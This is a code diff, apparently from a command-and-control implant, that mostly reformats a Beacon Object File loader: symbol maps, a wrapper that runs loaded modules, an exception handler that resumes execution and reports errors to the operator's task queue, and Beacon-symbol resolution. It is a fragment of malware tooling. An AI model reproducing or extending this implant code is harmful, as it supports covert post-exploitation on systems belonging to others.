@@ -5,14 +5,15 @@ using namespace Xtea;
 using namespace Utils;
 using namespace Opsec;
 using namespace Stream;
+using namespace Dispatcher;
 using namespace Utils::Scanners;
 using namespace Memory::Methods;
 
 namespace Objects {
 
+    PVOID __attribute__((used, section(".data"))) wrapper_return = nullptr;
     // TODO: add common BOF/internal implant functions
-    HASH_MAP
-        __attribute__((used, section(".rdata"))) internal_map[] = {
+    HASH_MAP __attribute__((used, section(".rdata"))) internal_map[] = {
         { .name = 0, .address = nullptr },
         { .name = 0, .address = nullptr },
         { .name = 0, .address = nullptr },
@@ -22,8 +23,7 @@ namespace Objects {
         { .name = 0, .address = nullptr },
     };
 
-    HASH_MAP
-        __attribute__((used, section(".rdata"))) bof_map[] = {
+    HASH_MAP __attribute__((used, section(".rdata"))) bof_map[] = {
         { .name = 0, .address = nullptr },
         { .name = 0, .address = nullptr },
         { .name = 0, .address = nullptr },
@@ -32,39 +32,34 @@ namespace Objects {
         { .name = 0, .address = nullptr },
         { .name = 0, .address = nullptr },
     };
-
-    PVOID
-        __attribute__((used, section(".data"))) wrapper_return = nullptr;
 
     LONG WINAPI ExceptionHandler(PEXCEPTION_POINTERS exception) {
 
         _stream *stream = CreateTaskResponse(TypeError);
-
         exception->ContextRecord->IP_REG = U_PTR(wrapper_return);
 
-        PackUint32(stream,   ERROR_UNHANDLED_EXCEPTION);
-        PackUint32(stream,   exception->ExceptionRecord->ExceptionCode);
+        PackUint32(stream, ERROR_UNHANDLED_EXCEPTION);
+        PackUint32(stream, exception->ExceptionRecord->ExceptionCode);
         PackPointer(stream, C_PTR(U_PTR(exception->ExceptionRecord->ExceptionAddress)));
 
-        Dispatcher::MessageQueue(stream);
-
+        MessageQueue(stream);
         return EXCEPTION_CONTINUE_EXECUTION;
     }
 
-    VOID WrapperFunction(void *address, void *args, size_t size) {
+    VOID WrapperFunction(VOID *address, VOID *args, SIZE_T size) {
 
         auto function = (OBJ_ENTRY) address;
 
         wrapper_return = __builtin_extract_return_addr(__builtin_return_address(0));
-        function((char*)args, size);
+        function((CHAR*)args, size);
     }
 
-    BOOL ProcessSymbol(char* sym_string, void ** pointer) {
+    BOOL ProcessSymbol(CHAR* sym_string, VOID **pointer) {
 
-        char *function  = nullptr;
+        CHAR *function  = nullptr;
 
-        *pointer = nullptr;
         // __imp_Beacon
+        *pointer = nullptr;
         if (HashStringA(sym_string, COFF_PREP_BEACON_SIZE) == COFF_PREP_BEACON) {
 
             function = sym_string + COFF_PREP_BEACON_SIZE;
